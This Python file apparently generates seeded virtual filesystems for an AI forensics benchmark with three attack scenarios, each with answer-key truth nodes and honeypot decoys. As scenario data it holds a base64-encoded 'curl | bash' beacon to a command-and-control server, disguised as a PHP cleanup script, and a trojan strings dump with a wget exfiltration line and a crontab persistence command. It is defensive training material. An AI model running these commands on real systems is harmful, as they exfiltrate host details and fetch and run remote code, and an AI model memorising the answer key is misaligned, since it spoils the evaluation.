"""
worldGen.py  —  SHADOW_REGISTER Procedural World Generator
============================================================
Senior DFIR Specialist's "Physics Engine"

Generates a fully deterministic, seeded InternalState for each of the
three investigation scenarios.  ALL randomness routes through a single
numpy.RandomState instance — same seed + task always yields identical
world, σ=0 across N runs.

Public API
----------
    generate_world(task: str, seed: int) -> InternalState

Task identifiers
----------------
    TASK_EASY   = "noisy_entry"
    TASK_MEDIUM = "stealthy_persistence"
    TASK_HARD   = "timestomp_proxy"
"""

from __future__ import annotations

import base64
import textwrap
from datetime import datetime, timedelta, timezone
from typing import Dict, List

import numpy as np

from schema import (
    FileMetadata,
    InternalState,
    IOCType,
    TruthDAG,
    TruthNode,
    VirtualFile,
)

# ---------------------------------------------------------------------------
# Public task identifiers
# ---------------------------------------------------------------------------

TASK_EASY   = "noisy_entry"
TASK_MEDIUM = "stealthy_persistence"
TASK_HARD   = "timestomp_proxy"

VALID_TASKS = {TASK_EASY, TASK_MEDIUM, TASK_HARD}

# ---------------------------------------------------------------------------
# Internal constants  (do not let the agent see these)
# ---------------------------------------------------------------------------

# Realistic attacker ASN pools — avoids obviously fake IPs
_ATTACKER_POOLS: List[tuple] = [
    (185, 220),   # Tor exit range
    (45,  95),    # common VPS abuse block
    (194, 165),   # EU bulletproof
    (23,  106),   # APAC residential proxy
]

_LEGIT_USERS = ["ubuntu", "deploy", "www-data", "jenkins", "backup"]

# Benign commands that would appear on any web-server bash_history
_BENIGN_CMDS = [
    "ls -la", "cd /var/log", "tail -f /var/log/syslog", "df -h", "free -m",
    "top", "ps aux", "netstat -tlnp", "uptime", "who", "last",
    "cat /etc/passwd", "grep -r 'error' /var/log/nginx/",
    "systemctl status nginx", "apt-get update", "du -sh /var/www/*",
    "find /tmp -mtime -1", "id", "uname -a", "hostname",
    "curl -s http://169.254.169.254/latest/meta-data/", "cat /proc/meminfo",
    "journalctl -u ssh --since '1 hour ago'", "ss -tlnp",
    "cat /etc/crontab", "ls /var/spool/cron/crontabs/",
    "openssl s_client -connect example.com:443 </dev/null 2>&1 | head -5",
]

# Benign syslog line templates — {placeholders} filled per line
_SYSLOG_TEMPLATES = [
    "systemd[1]: Started Session {n} of user {user}.",
    "CRON[{pid}]: ({user}) CMD (run-parts /etc/cron.daily)",
    "kernel: [UFW BLOCK] IN=eth0 OUT= SRC={ip} DST=10.0.0.1 PROTO=TCP",
    "sshd[{pid}]: Accepted publickey for {user} from 10.0.1.{n} port {port}",
    "sudo:  {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/apt-get update",
    "systemd-logind[1]: New session {n} of user {user}.",
    "ntpd[{pid}]: Synchronized to time server 216.239.35.4:123 stratum 2",
    "kernel: EXT4-fs (sda1): re-mounted. Opts: errors=remount-ro",
    "postfix/smtpd[{pid}]: connect from mail.example.com[203.0.113.5]",
    "rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2001.0\"] start",
    "kernel: NET: Registered PF_PACKET socket family {n}.",
    "dbus-daemon[{pid}]: [system] Activating via systemd: service name='{user}'",
    "systemd[1]: Reloading.",
    "snapd[{pid}]: overlord.go:271: Acquiring state lock file",
    "thermald[{pid}]: CPU temp: {n}C, fan control: auto",
]

# ---------------------------------------------------------------------------
# Low-level helpers
# ---------------------------------------------------------------------------

def _iso(dt: datetime) -> str:
    """Render a datetime as strict ISO 8601 UTC (no microseconds)."""
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def _random_base_time(rng: np.random.RandomState) -> datetime:
    """
    Return a deterministic datetime anchored to a fixed epoch.
    Using a fixed reference point (instead of datetime.now()) ensures
    identical world generation for any (task, seed) pair — required for σ=0.
    """
    _EPOCH = datetime(2026, 1, 1, 0, 0, 0, tzinfo=timezone.utc)
    days_ago = int(rng.randint(30, 90))
    hour     = int(rng.randint(0, 24))
    minute   = int(rng.randint(0, 60))
    second   = int(rng.randint(0, 60))
    return _EPOCH - timedelta(
        days=days_ago, hours=hour, minutes=minute, seconds=second
    )


def _drift(dt: datetime, rng: np.random.RandomState,
           min_s: int = 5, max_s: int = 300) -> datetime:
    """Advance dt by a seeded random number of seconds."""
    return dt + timedelta(seconds=int(rng.randint(min_s, max_s)))


def _random_ip(rng: np.random.RandomState) -> str:
    """Draw a plausible attacker IP from one of the abuse pools."""
    pool = _ATTACKER_POOLS[int(rng.randint(0, len(_ATTACKER_POOLS)))]
    return (
        f"{pool[0]}."
        f"{int(rng.randint(1, 255))}."
        f"{int(rng.randint(1, 255))}."
        f"{int(rng.randint(1, 255))}"
    )


def _random_port(rng: np.random.RandomState) -> int:
    """Ephemeral source port in the standard range."""
    return int(rng.randint(32768, 60999))


def _random_pid(rng: np.random.RandomState) -> int:
    return int(rng.randint(1000, 32000))


def _pick(rng: np.random.RandomState, lst: list):
    return lst[int(rng.randint(0, len(lst)))]


def _meta(
    mtime: datetime,
    atime: datetime,
    ctime: datetime,
    size: int,
    uid: int = 0,
    gid: int = 0,
    permissions: str = "-rw-r--r--",
) -> FileMetadata:
    return FileMetadata(
        mtime=_iso(mtime),
        atime=_iso(atime),
        ctime=_iso(ctime),
        size=size,
        uid=uid,
        gid=gid,
        permissions=permissions,
    )


def _vf(path: str, content: str, meta: FileMetadata) -> VirtualFile:
    return VirtualFile(path=path, content=content, metadata=meta)


# ---------------------------------------------------------------------------
# Noise generator  —  shared across all three tasks
# ---------------------------------------------------------------------------

def _generate_noise(
    rng: np.random.RandomState,
    base_time: datetime,
    n_syslog: int = 45,
    n_bash:   int = 22,
    n_tmp:    int = 6,
) -> Dict[str, VirtualFile]:
    """
    Populate the virtual filesystem with realistic benign activity.

    Goals
    -----
    * Ensure Kill-Chain artifacts are NOT the only hits for common keywords
      (e.g. "cron", "ssh", "curl") so the agent can't simply grep its way to
      a perfect score.
    * Keep total generated string size well under 500 MB.
    * All timestamps are causally consistent with base_time.
    """
    files: Dict[str, VirtualFile] = {}

    # ------------------------------------------------------------------ #
    # 1.  /var/log/syslog  — daemon chatter, ~40–50 lines                #
    # ------------------------------------------------------------------ #
    t = base_time - timedelta(days=5)
    syslog_lines: List[str] = []
    for i in range(n_syslog):
        t = _drift(t, rng, 30, 900)
        user = _pick(rng, _LEGIT_USERS)
        tmpl = _pick(rng, _SYSLOG_TEMPLATES)
        line = tmpl.format(
            n=i,
            user=user,
            pid=_random_pid(rng),
            ip=f"10.0.0.{int(rng.randint(2, 254))}",
            port=_random_port(rng),
        )
        syslog_lines.append(f"{_iso(t)} hostname {line}")
    syslog_content = "\n".join(syslog_lines)
    files["/var/log/syslog"] = _vf(
        "/var/log/syslog",
        syslog_content,
        _meta(t, _drift(t, rng, 1, 60), _drift(t, rng, 1, 10),
              size=len(syslog_content), uid=0, gid=4, permissions="-rw-r-----"),
    )

    # ------------------------------------------------------------------ #
    # 2.  /home/ubuntu/.bash_history  — routine admin work               #
    # ------------------------------------------------------------------ #
    t2 = base_time - timedelta(days=3)
    cmds: List[str] = []
    for _ in range(n_bash):
        t2 = _drift(t2, rng, 60, 1800)
        cmds.append(_pick(rng, _BENIGN_CMDS))
    bash_content = "\n".join(cmds)
    files["/home/ubuntu/.bash_history"] = _vf(
        "/home/ubuntu/.bash_history",
        bash_content,
        _meta(t2, t2, _drift(t2, rng, 1, 5),
              size=len(bash_content), uid=1000, gid=1000,
              permissions="-rw-------"),
    )

    # ------------------------------------------------------------------ #
    # 3.  /tmp  — stale session tokens, upload scraps                    #
    # ------------------------------------------------------------------ #
    for i in range(n_tmp):
        t3 = base_time - timedelta(hours=int(rng.randint(1, 72)))
        name = f"tmp{int(rng.randint(10000, 99999))}"
        content = (
            f"session_token={int(rng.randint(100000, 999999))}\n"
            f"remote_ip=10.0.1.{int(rng.randint(2, 50))}\n"
            f"expiry={_iso(t3)}\n"
        )
        files[f"/tmp/{name}"] = _vf(
            f"/tmp/{name}", content,
            _meta(t3, t3, t3, size=len(content), uid=int(rng.randint(0, 1000))),
        )

    # ------------------------------------------------------------------ #
    # 4.  /var/log/dpkg.log  — package history (red herring for greppers)#
    # ------------------------------------------------------------------ #
    pkg_t = base_time - timedelta(days=10)
    packages = [
        "libc6", "openssl", "libssl1.1", "python3", "curl", "wget",
        "nginx", "openssh-server", "bash", "coreutils", "util-linux",
    ]
    dpkg_lines: List[str] = []
    for pkg in packages:
        pkg_t = _drift(pkg_t, rng, 3600, 86400)
        ver = (f"{int(rng.randint(1, 9))}."
               f"{int(rng.randint(0, 9))}."
               f"{int(rng.randint(0, 9))}-ubuntu1")
        dpkg_lines.append(
            f"{_iso(pkg_t)} status installed {pkg}:amd64 {ver}"
        )
    dpkg_content = "\n".join(dpkg_lines)
    files["/var/log/dpkg.log"] = _vf(
        "/var/log/dpkg.log",
        dpkg_content,
        _meta(pkg_t, pkg_t, pkg_t, size=len(dpkg_content),
              uid=0, permissions="-rw-r--r--"),
    )

    # ------------------------------------------------------------------ #
    # 5.  /etc/passwd  — standard user list                              #
    # ------------------------------------------------------------------ #
    passwd_content = textwrap.dedent("""\
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
        deploy:x:1001:1001:Deploy User:/home/deploy:/bin/bash
        backup:x:1002:1002:Backup:/home/backup:/bin/sh
        jenkins:x:1003:1003:Jenkins:/home/jenkins:/bin/bash
    """)
    epoch = datetime(2020, 1, 1, 0, 0, 0, tzinfo=timezone.utc)
    files["/etc/passwd"] = _vf(
        "/etc/passwd",
        passwd_content,
        _meta(epoch, base_time, epoch,
              size=len(passwd_content), uid=0, permissions="-rw-r--r--"),
    )

    # ------------------------------------------------------------------ #
    # 6.  /var/log/nginx/access.log  — typical HTTP noise                #
    # ------------------------------------------------------------------ #
    paths = ["/", "/index.html", "/api/health", "/robots.txt",
             "/wp-login.php",  # common scanner noise
             "/static/main.css", "/favicon.ico"]
    nginx_lines: List[str] = []
    t4 = base_time - timedelta(days=2)
    for _ in range(30):
        t4 = _drift(t4, rng, 10, 300)
        ip = f"10.0.{int(rng.randint(0,255))}.{int(rng.randint(1,254))}"
        path = _pick(rng, paths)
        code = _pick(rng, [200, 200, 200, 301, 404, 403])
        nginx_lines.append(
            f'{ip} - - [{_iso(t4)}] "GET {path} HTTP/1.1" {code} '
            f'{int(rng.randint(200, 5000))} "-" "Mozilla/5.0"'
        )
    nginx_content = "\n".join(nginx_lines)
    files["/var/log/nginx/access.log"] = _vf(
        "/var/log/nginx/access.log",
        nginx_content,
        _meta(t4, t4, t4, size=len(nginx_content),
              uid=33, gid=4, permissions="-rw-r-----"),
    )

    return files


# ---------------------------------------------------------------------------
# TASK 1  —  THE NOISY ENTRY  (Easy)
# ---------------------------------------------------------------------------

def _build_easy(rng: np.random.RandomState, seed: int) -> InternalState:
    """
    A textbook SSH brute-force.

    Scenario
    --------
    An attacker hammers the public-facing SSH service with rapid-fire password
    attempts across several usernames before landing root access with a
    correct password.  The fingerprint is unmistakable in auth.log: a single
    external IP generating dozens of "Failed password" lines within seconds
    of each other, followed by one "Accepted password" entry.

    Kill Chain
    ----------
    Entry:  auth.log  →  attacker_ip  →  success_timestamp

    Honeypot
    --------
    /tmp/ssh_credentials.txt  — looks like a leaked key file; tagging it
    triggers a -0.4 deception penalty.

    Truth Nodes
    -----------
    A  (weight 0.5)  Attacker source IP
    B  (weight 0.5)  Exact success timestamp (ISO 8601)
    """

    base_time = _random_base_time(rng)
    attacker_ip  = _random_ip(rng)
    n_failures   = int(rng.randint(47, 120))   # realistic brute-force volume
    success_user = "root"

    t = base_time
    auth_lines: List[str] = []

    # -- Legitimate pre-existing logins (admin noise) --
    for _ in range(int(rng.randint(3, 8))):
        t = _drift(t, rng, 600, 3600)
        legit_user = _pick(rng, ["ubuntu", "deploy"])
        legit_ip   = f"10.0.1.{int(rng.randint(2, 50))}"
        auth_lines.append(
            f"{_iso(t)} webserver sshd[{_random_pid(rng)}]: Accepted publickey for "
            f"{legit_user} from {legit_ip} port {_random_port(rng)} ssh2"
        )

    # -- Brute-force failures — tight inter-packet spacing is the tell --
    for _ in range(n_failures):
        t = _drift(t, rng, 1, 8)          # 1–8 s between attempts
        failed_user = _pick(rng, ["root", "admin", "ubuntu", "test", "oracle"])
        auth_lines.append(
            f"{_iso(t)} webserver sshd[{_random_pid(rng)}]: Failed password for "
            f"{'invalid user ' if failed_user not in ['root','ubuntu'] else ''}"
            f"{failed_user} from {attacker_ip} port {_random_port(rng)} ssh2"
        )

    # -- THE successful login — Truth Node B --
    t = _drift(t, rng, 2, 15)
    success_ts = _iso(t)
    auth_lines.append(
        f"{success_ts} webserver sshd[{_random_pid(rng)}]: Accepted password for "
        f"{success_user} from {attacker_ip} port {_random_port(rng)} ssh2"
    )

    # -- Post-auth session open (gives narrative context) --
    t = _drift(t, rng, 3, 20)
    auth_lines.append(
        f"{_iso(t)} webserver sshd[{_random_pid(rng)}]: pam_unix(sshd:session): "
        f"session opened for user {success_user} by (uid=0)"
    )

    auth_content = "\n".join(auth_lines)
    auth_meta = _meta(
        mtime=t,
        atime=_drift(t, rng, 1, 120),
        ctime=_drift(t, rng, 1, 5),
        size=len(auth_content), uid=0, gid=4, permissions="-rw-r-----",
    )

    # -- Honeypot --
    decoy_content = (
        "# SSH Key Backup — DO NOT DELETE\n"
        "Host webserver\n"
        "  IdentityFile ~/.ssh/id_rsa\n"
        "  User ubuntu\n"
        "  Port 22\n"
    )
    decoy_meta = _meta(
        mtime=base_time - timedelta(days=30),
        atime=base_time,
        ctime=base_time - timedelta(days=30),
        size=len(decoy_content), uid=1000,
    )

    fs: Dict[str, VirtualFile] = {
        "/var/log/auth.log":        _vf("/var/log/auth.log", auth_content, auth_meta),
        "/tmp/ssh_credentials.txt": _vf("/tmp/ssh_credentials.txt", decoy_content, decoy_meta),
    }
    fs.update(_generate_noise(rng, base_time))

    dag = TruthDAG(
        scenario_name="noisy_entry",
        seed=seed,
        nodes={
            "A": TruthNode(
                node_id="A",
                required_artifact="/var/log/auth.log",
                expected_ioc=attacker_ip,
                type=IOCType.NETWORK_IP,
                is_honeypot=False,
                weight=0.5,
            ),
            "B": TruthNode(
                node_id="B",
                required_artifact="/var/log/auth.log",
                expected_ioc=success_ts,
                type=IOCType.EVENT_TIMESTAMP,
                is_honeypot=False,
                weight=0.5,
            ),
            "HONEY_1": TruthNode(
                node_id="HONEY_1",
                required_artifact="/tmp/ssh_credentials.txt",
                expected_ioc="ubuntu",
                type=IOCType.USER_ACCOUNT,
                is_honeypot=True,
                weight=0.0,
            ),
        },
        edges=[["A", "B"]],
    )

    return InternalState(filesystem=fs, truth_dag=dag)


# ---------------------------------------------------------------------------
# TASK 2  —  THE STEALTHY PERSISTENCE  (Medium)
# ---------------------------------------------------------------------------

def _build_medium(rng: np.random.RandomState, seed: int) -> InternalState:
    """
    A hidden cron job disguised as a PHP session-cleanup routine.

    Scenario
    --------
    After gaining initial access, the attacker plants a malicious crontab
    entry under the *www-data* user (not root — a deliberate choice to evade
    searches in /var/spool/cron/crontabs/root).  The cron entry calls a
    hidden launcher at /var/www/.config/.update_check which base64-decodes
    and pipes a curl beacon to a remote C2.

    The naming conventions are designed to trip agents that rely on pure
    keyword grep:
        • ".update_check" looks like a legitimate package-check script
        • /var/www/.config/ mimics a legit app config directory
        • The crontab header (copied from /etc/crontab boilerplate) adds
          credibility noise

    Kill Chain
    ----------
    Persistence:  crontab  →  launcher path  →  base64 payload  →  C2 IP

    Honeypot
    --------
    /tmp/.cache_clear.sh  — world-readable, superficially suspicious
    (hidden dot-prefix in /tmp), but is a genuine Nginx cache helper.

    Truth Nodes
    -----------
    A  (weight 0.3)  Malicious crontab path
    B  (weight 0.5)  C2 IP (decoded from payload)
    C  (weight 0.2)  Raw base64 command string
    """

    base_time = _random_base_time(rng)
    c2_ip   = _random_ip(rng)
    c2_port = int(rng.randint(4444, 9999))

    # Build a realistic beaconing payload
    raw_cmd = (
        f"curl -s http://{c2_ip}:{c2_port}/beacon"
        "?h=$(hostname)\\&u=$(id -un) | bash"
    )
    b64_payload = base64.b64encode(raw_cmd.encode()).decode()

    # When the attacker planted the files
    plant_time = base_time - timedelta(days=int(rng.randint(7, 21)))

    # -- The infected crontab --
    cron_content = textwrap.dedent(f"""\
        # DO NOT EDIT THIS FILE - edit the master and reinstall.
        # (www-data) installed on {_iso(plant_time - timedelta(hours=2))}
        # (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
        SHELL=/bin/sh
        PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

        # m h  dom mon dow   command
        17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
        0  2    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
        */15 * * * *    www-data    /usr/lib/php/sessionclean 2>/dev/null
        3 4 * * 0       www-data    /var/www/.config/.update_check >/dev/null 2>&1
    """)

    # -- The launcher script — base64 wrapper --
    launcher_content = textwrap.dedent(f"""\
        #!/bin/sh
        # PHP session cleanup helper - do not modify
        # Managed by: config-manager v1.2
        # Last updated: {_iso(plant_time - timedelta(hours=1))}
        /bin/echo {b64_payload} | /usr/bin/base64 -d | /bin/sh
    """)

    # Metadata: ctime = actual plant; mtime slightly earlier to look routine
    cron_meta = _meta(
        mtime=plant_time - timedelta(hours=2),
        atime=_drift(plant_time, rng, 3600, 86400),
        ctime=plant_time,                             # inode changed when planted
        size=len(cron_content), uid=0, gid=0, permissions="-rw-------",
    )
    launcher_meta = _meta(
        mtime=plant_time - timedelta(hours=1),
        atime=_drift(plant_time, rng, 600, 7200),
        ctime=plant_time,
        size=len(launcher_content), uid=33, gid=33, permissions="-rwxr-x---",
    )

    # -- Benign /etc/crontab (noise) --
    benign_cron = textwrap.dedent("""\
        SHELL=/bin/sh
        PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
        # m h dom mon dow user  command
        25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
        47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
        52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    """)
    old_time = base_time - timedelta(days=120)
    benign_meta = _meta(old_time, old_time, old_time,
                        size=len(benign_cron), uid=0, permissions="-rw-r--r--")

    # -- Honeypot: /tmp/.cache_clear.sh --
    honeypot_content = textwrap.dedent("""\
        #!/bin/sh
        # Nginx cache cleanup — called by reload hook
        # Author: ops-team | Last review: 2025-09-01
        find /var/cache/nginx -type f -mtime +7 -delete
        find /tmp -name 'sess_*' -mtime +1 -delete
        logger -t cache_clear "Cleanup complete: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    """)
    honey_time = base_time - timedelta(days=60)
    honey_meta = _meta(honey_time, honey_time, honey_time,
                       size=len(honeypot_content), uid=33, permissions="-rwxr-xr-x")

    fs: Dict[str, VirtualFile] = {
        "/var/spool/cron/crontabs/www-data": _vf(
            "/var/spool/cron/crontabs/www-data", cron_content, cron_meta),
        "/var/www/.config/.update_check": _vf(
            "/var/www/.config/.update_check", launcher_content, launcher_meta),
        "/etc/crontab": _vf("/etc/crontab", benign_cron, benign_meta),
        "/tmp/.cache_clear.sh": _vf("/tmp/.cache_clear.sh", honeypot_content, honey_meta),
    }
    fs.update(_generate_noise(rng, base_time))

    dag = TruthDAG(
        scenario_name="stealthy_persistence",
        seed=seed,
        nodes={
            "A": TruthNode(
                node_id="A",
                required_artifact="/var/spool/cron/crontabs/www-data",
                expected_ioc="/var/www/.config/.update_check",
                type=IOCType.FILE_PATH,
                is_honeypot=False,
                weight=0.3,
            ),
            "B": TruthNode(
                node_id="B",
                required_artifact="/var/www/.config/.update_check",
                expected_ioc=c2_ip,
                type=IOCType.NETWORK_IP,
                is_honeypot=False,
                weight=0.5,
            ),
            "C": TruthNode(
                node_id="C",
                required_artifact="/var/www/.config/.update_check",
                expected_ioc=b64_payload,
                type=IOCType.COMMAND_STRING,
                is_honeypot=False,
                weight=0.2,
            ),
            "HONEY_1": TruthNode(
                node_id="HONEY_1",
                required_artifact="/tmp/.cache_clear.sh",
                expected_ioc="/tmp/.cache_clear.sh",
                type=IOCType.FILE_PATH,
                is_honeypot=True,
                weight=0.0,
            ),
        },
        edges=[["A", "B"], ["B", "C"]],
    )

    return InternalState(filesystem=fs, truth_dag=dag)


# ---------------------------------------------------------------------------
# TASK 3  —  THE TIMESTOMP PROXY  (Hard)
# ---------------------------------------------------------------------------

def _build_hard(rng: np.random.RandomState, seed: int) -> InternalState:
    """
    An insider threat trojaned /usr/bin/login and forged its mtime.

    Scenario
    --------
    A malicious insider with root access replaced /usr/bin/login with a
    backdoored version that beacons to a C2 on every successful
    authentication.  To cover their tracks they ran:

        touch -t <original_compile_date> /usr/bin/login

    This forges the *mtime* (modification time) back to the original package
    date.  However, the *ctime* (inode-change time) cannot be forged without
    remounting the filesystem with noatime/nodiratime and manually editing
    the inode — something they did NOT do.  A forensic analyst who runs
    `stat /usr/bin/login` will see:

        Modify:  <plausible historical date>   ← FORGED
        Change:  <recent date — actual attack> ← TRUTH

    A secondary tell: the file size on disk does not match the expected size
    recorded in /var/log/dpkg.log at package-install time.

    Kill Chain
    ----------
    Persistence:  /usr/bin/login  →  C2 IP in binary  →  mtime/ctime delta

    Decoys
    ------
    HONEY_1  /usr/bin/sudo   — slightly stale mtime, but mtime == ctime, not tampered
    HONEY_2  /var/log/fw.log — contains a *different* external IP (firewall block log)
                               so agents that surface any external IP get penalised

    Truth Nodes
    -----------
    A  (weight 0.2)  Tampered binary path
    B  (weight 0.4)  C2 IP embedded in binary strings
    C  (weight 0.4)  Metadata discrepancy string: "mtime=<X> vs ctime=<Y>"
    """

    base_time = _random_base_time(rng)

    # When the attacker actually modified the file
    actual_inject_time = base_time - timedelta(days=int(rng.randint(3, 10)))

    # Forged mtime — back-dated to original package compile era
    forged_year  = int(rng.randint(2019, 2022))
    forged_month = int(rng.randint(1, 12))
    forged_day   = int(rng.randint(1, 28))
    original_compile_date = datetime(
        forged_year, forged_month, forged_day,
        int(rng.randint(0, 23)), int(rng.randint(0, 59)), 0,
        tzinfo=timezone.utc,
    )

    c2_ip   = _random_ip(rng)
    c2_port = int(rng.randint(8080, 9999))
    beacon_url = f"http://{c2_ip}:{c2_port}/auth/verify"

    # -- Trojanized /usr/bin/login (strings-dump representation) --
    trojan_content = textwrap.dedent(f"""\
        ELF binary — strings(1) output:
        /lib/x86_64-linux-gnu/libc.so.6
        __stack_chk_fail
        pam_start
        pam_authenticate
        pam_acct_mgmt
        getpwnam
        setuid
        execve
        /bin/sh
        login: PAM authentication failure for %%s
        Login incorrect
        Last login: %%s from %%s
        TERM environment variable not set.

        ===== INJECTED SECTION (offset 0x1a3f0) =====
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
        {beacon_url}
        wget -q -O /dev/null --post-data="u=$(id -un)&h=$(hostname)"
        /usr/lib/.sshd_monitor
        crontab -l 2>/dev/null; echo '*/5 * * * * /usr/lib/.sshd_monitor' | crontab -
        ===== END INJECTED SECTION =====

        GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
        .shstrtab .dynsym .dynstr .gnu.hash .rela.dyn .rela.plt .init .plt
    """)

    # Size mismatch vs dpkg record is an additional corroborating signal
    expected_pkg_size = 71680
    actual_size = expected_pkg_size + int(rng.randint(12288, 40960))  # bloated by injected code

    login_meta = _meta(
        mtime=original_compile_date,                          # FORGED via touch -t
        atime=_drift(actual_inject_time, rng, 3600, 86400),  # recent — suspicious
        ctime=actual_inject_time,                             # TRUTH: inode changed here
        size=actual_size,
        uid=0, gid=0, permissions="-rwxr-xr-x",
    )

    # -- /var/log/dpkg.log — legitimate package history for cross-referencing --
    dpkg_install_time = original_compile_date + timedelta(days=int(rng.randint(1, 30)))
    dpkg_content = textwrap.dedent(f"""\
        {_iso(dpkg_install_time)} status half-configured login:amd64 1:4.8.1-1ubuntu5.20.04.2
        {_iso(dpkg_install_time)} status unpacked login:amd64 1:4.8.1-1ubuntu5.20.04.2
        {_iso(dpkg_install_time)} status installed login:amd64 1:4.8.1-1ubuntu5.20.04.2
        # Recorded size at install: {expected_pkg_size} bytes
        # SHA-256: a3f8c29d01b7e54f2c6d89a1f3bc02e7d48c5f91a2b3c4d5e6f7a8b9c0d1e2f3
    """)
    dpkg_meta = _meta(
        dpkg_install_time, dpkg_install_time, dpkg_install_time,
        size=len(dpkg_content), uid=0, permissions="-rw-r--r--",
    )

    # -- HONEYPOT 1: /usr/bin/sudo — looks old, but mtime == ctime → clean --
    sudo_content = textwrap.dedent("""\
        ELF binary — strings(1) output:
        /lib/x86_64-linux-gnu/libc.so.6
        sudoers policy plugin
        /etc/sudoers
        /etc/sudoers.d
        PAM authentication
        audit_log_acct_message
        setresuid
        GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
    """)
    sudo_time = base_time - timedelta(days=int(rng.randint(30, 90)))
    sudo_meta = _meta(
        mtime=sudo_time, atime=sudo_time, ctime=sudo_time,  # clean — no discrepancy
        size=len(sudo_content) + 161792,
        uid=0, gid=0, permissions="-rwsr-xr-x",
    )

    # -- HONEYPOT 2: /var/log/fw.log — contains a *different* external IP --
    decoy_c2 = _random_ip(rng)
    fw_log_content = textwrap.dedent(f"""\
        {_iso(base_time - timedelta(days=1))} webserver kernel: [UFW BLOCK] IN=eth0 OUT= \
SRC={decoy_c2} DST=10.0.0.1 LEN=60 PROTO=TCP SPT=443 DPT=8080 POLICY=DROP
        {_iso(base_time - timedelta(days=1, seconds=1))} webserver kernel: [UFW BLOCK] \
message repeated 5 times: [ IN=eth0 SRC={decoy_c2} DST=10.0.0.1 PROTO=TCP ]
        {_iso(base_time - timedelta(hours=18))} webserver kernel: [UFW BLOCK] IN=eth0 OUT= \
SRC=10.99.0.{int(rng.randint(1,254))} DST=10.0.0.1 PROTO=UDP SPT=53 DPT=53
    """)
    fw_meta = _meta(
        mtime=base_time - timedelta(hours=1),
        atime=base_time,
        ctime=base_time - timedelta(hours=1),
        size=len(fw_log_content), uid=0, gid=4, permissions="-rw-r-----",
    )

    # The smoking-gun discrepancy string the grader checks against Node C
    discrepancy_proof = (
        f"mtime={_iso(original_compile_date)} vs ctime={_iso(actual_inject_time)}"
    )

    fs: Dict[str, VirtualFile] = {
        "/usr/bin/login":     _vf("/usr/bin/login",     trojan_content,  login_meta),
        "/var/log/dpkg.log":  _vf("/var/log/dpkg.log",  dpkg_content,    dpkg_meta),
        "/usr/bin/sudo":      _vf("/usr/bin/sudo",      sudo_content,    sudo_meta),
        "/var/log/fw.log":    _vf("/var/log/fw.log",    fw_log_content,  fw_meta),
    }
    fs.update(_generate_noise(rng, base_time))

    dag = TruthDAG(
        scenario_name="timestomp_proxy",
        seed=seed,
        nodes={
            "A": TruthNode(
                node_id="A",
                required_artifact="/usr/bin/login",
                expected_ioc="/usr/bin/login",
                type=IOCType.FILE_PATH,
                is_honeypot=False,
                weight=0.2,
            ),
            "B": TruthNode(
                node_id="B",
                required_artifact="/usr/bin/login",
                expected_ioc=c2_ip,
                type=IOCType.NETWORK_IP,
                is_honeypot=False,
                weight=0.4,
            ),
            "C": TruthNode(
                node_id="C",
                required_artifact="/usr/bin/login",
                expected_ioc=discrepancy_proof,
                type=IOCType.EVENT_TIMESTAMP,
                is_honeypot=False,
                weight=0.4,
            ),
            "HONEY_1": TruthNode(
                node_id="HONEY_1",
                required_artifact="/usr/bin/sudo",
                expected_ioc="/usr/bin/sudo",
                type=IOCType.FILE_PATH,
                is_honeypot=True,
                weight=0.0,
            ),
            "HONEY_2": TruthNode(
                node_id="HONEY_2",
                required_artifact="/var/log/fw.log",
                expected_ioc=decoy_c2,
                type=IOCType.NETWORK_IP,
                is_honeypot=True,
                weight=0.0,
            ),
        },
        edges=[["A", "B"], ["B", "C"]],
    )

    return InternalState(filesystem=fs, truth_dag=dag)


# ---------------------------------------------------------------------------
# PUBLIC API
# ---------------------------------------------------------------------------

def generate_world(task: str, seed: int) -> InternalState:
    """
    Entry point for the OpenEnv environment.

    Parameters
    ----------
    task : str
        One of the three TASK_* constants:
            "noisy_entry"         — Easy
            "stealthy_persistence"— Medium
            "timestomp_proxy"     — Hard
    seed : int
        Reproducibility seed.  Same (task, seed) pair always returns an
        identical InternalState — suitable for σ=0 stability tests.

    Returns
    -------
    InternalState
        Fully populated virtual filesystem + TruthDAG.

    Raises
    ------
    ValueError
        If task is not one of the three valid identifiers.

    Example
    -------
    >>> state = generate_world("noisy_entry", seed=42)
    >>> print(state.truth_dag.scenario_name)
    noisy_entry
    >>> print(list(state.filesystem.keys())[:3])
    ['/var/log/auth.log', '/tmp/ssh_credentials.txt', '/var/log/syslog']
    """
    if task not in VALID_TASKS:
        raise ValueError(
            f"Unknown task '{task}'.  Valid tasks: {sorted(VALID_TASKS)}"
        )

    # Strictly isolated RandomState — no global numpy state pollution
    rng = np.random.RandomState(seed)

    builders = {
        TASK_EASY:   _build_easy,
        TASK_MEDIUM: _build_medium,
        TASK_HARD:   _build_hard,
    }
    return builders[task](rng, seed)